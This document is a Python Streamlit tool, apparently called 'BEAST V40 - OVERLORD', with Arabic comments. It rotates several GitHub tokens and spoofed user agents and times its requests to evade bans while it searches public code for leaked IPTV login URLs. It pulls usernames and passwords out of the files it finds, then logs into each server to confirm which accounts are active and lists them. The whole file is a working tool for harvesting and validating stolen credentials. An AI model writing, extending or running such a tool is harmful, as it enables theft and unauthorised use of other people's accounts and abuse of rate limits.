import streamlit as st
import requests
import re
import time
import random

# --- نظام التمويه المتقدم ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; rv:125.0) Gecko/20100101 Firefox/125.0"
]

st.set_page_config(page_title="BEAST V40 - OVERLORD", layout="wide")

# تصميم الواجهة
st.markdown("""
<style>
    .stApp { background-color: #050505; color: #00ff41; }
    .terminal { background: #000; border: 1px solid #1a1a1a; padding: 10px; font-family: monospace; color: #00ff41; height: 150px; overflow-y: auto; }
    .hit-box { background: #0d1117; border: 1px solid #30363d; border-right: 4px solid #00ff41; padding: 15px; margin-bottom: 10px; border-radius: 5px; }
</style>
""", unsafe_allow_html=True)

with st.sidebar:
    st.title("🏴‍☠️ BEAST V40")
    tokens_input = st.text_area("Tokens (One per line):", height=150)
    tokens = [t.strip() for t in tokens_input.split('\n') if t.strip()]
    pages = st.slider("Pages Depth:", 1, 100, 20)
    start = st.button("🚀 LAUNCH OVERLORD ENGINE")

# مساحات العرض
st.subheader("📟 System Logs")
log_area = st.empty()
st.subheader("🏆 Valid Arabic & Global Hits")
hits_container = st.container()

def fetch_content(url, token):
    headers = {'Authorization': f'token {token}', 'User-Agent': random.choice(USER_AGENTS)}
    try:
        res = requests.get(url, headers=headers, timeout=5)
        return res.text if res.status_code == 200 else None
    except: return None

if start and tokens:
    token_idx = 0
    # دروكات هجينة تستهدف الـ Commits والـ Gists أيضاً
    dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u8 "http" "username=" "password="',
        '"player_api.php" "username=" "password="',
        'filename:config.php "XTREAM_USER"'
    ]

    for dork in dorks:
        for page in range(1, pages + 1):
            current_token = tokens[token_idx % len(tokens)]
            headers = {'Authorization': f'token {current_token}', 'User-Agent': random.choice(USER_AGENTS)}
            
            # محاكاة تأخير "بشري" لكسر الـ IP Ban
            time.sleep(random.uniform(2, 4))
            
            # البحث في الـ Code
            api_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
            try:
                log_area.markdown(f"<div class='terminal'>[SCANNING] Dork: {dork[:20]} | Page: {page} | Token: {token_idx+1}</div>", unsafe_allow_html=True)
                res = requests.get(api_url, headers=headers)
                
                if res.status_code == 403:
                    token_idx += 1
                    continue
                
                items = res.json().get('items', [])
                for item in items:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    content = fetch_content(raw_url, current_token)
                    
                    if content:
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        for host, user, pw in matches:
                            try:
                                # فحص سريع (Pre-Check)
                                check = requests.get(f"{host}/player_api.php?username={user}&password={pw}", timeout=2).json()
                                if check.get("user_info", {}).get("status") == "Active":
                                    with hits_container:
                                        st.markdown(f"""<div class='hit-box'>
                                            <b style='color:#00ff41;'>ACTIVE SERVER FOUND:</b><br>
                                            <code style='color:#fff;'>{host}</code><br>
                                            <b>USER:</b> {user} | <b>PASS:</b> {pw}<br>
                                            <small style='color:#888;'>Exp: {check['user_info'].get('exp_date')}</small>
                                        </div>""", unsafe_allow_html=True)
                            except: continue
            except:
                token_idx += 1
                continue
